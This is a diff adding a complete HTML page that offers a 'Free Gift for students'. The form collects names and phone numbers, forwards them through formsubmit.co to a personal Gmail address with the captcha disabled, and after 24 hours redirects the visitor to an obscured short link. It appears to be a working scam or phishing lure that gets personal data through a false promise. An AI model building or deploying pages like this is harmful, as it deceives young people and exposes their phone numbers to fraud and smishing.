@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Contact Form</title>
+  <style>
+    body {
+      background-color: black;
+      color: blue;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 20px;
+    }
+
+    h1 {
+      text-align: center;
+    }
+
+    form {
+      max-width: 400px;
+      margin: 0 auto;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 5px;
+    }
+
+    input[type="text"],
+    input[type="tel"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      border: none;
+      border-radius: 5px;
+      background-color: #222;
+      color: #fff;
+    }
+
+    button[type="submit"] {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      background-color: blue;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>Free Gift for students</h1>
+  <p>You will receive an SMS in 24 hours after entering the details.</p>
+  <form action="https://formsubmit.co/dhrona1421@gmail.com" method="POST">
+    <input type="hidden" name="_subject" value="New Contact Form Submission">
+    <input type="hidden" name="_captcha" value="false">
+    <label for="name">Name:</label>
+    <input type="text" id="name" name="name" required>
+    <label for="phone">Phone Number:</label>
+    <input type="tel" id="phone" name="phone" required>
+    <button type="submit">Submit</button>
+  </form>
+  <script>
+    window.onload = function() {
+      setTimeout(function() {
+        window.location.href = "https://shorturl.at/nBHLV";
+      }, 86400000); // 24 hours in milliseconds
+    };
+  </script>
+</body>
+</html>
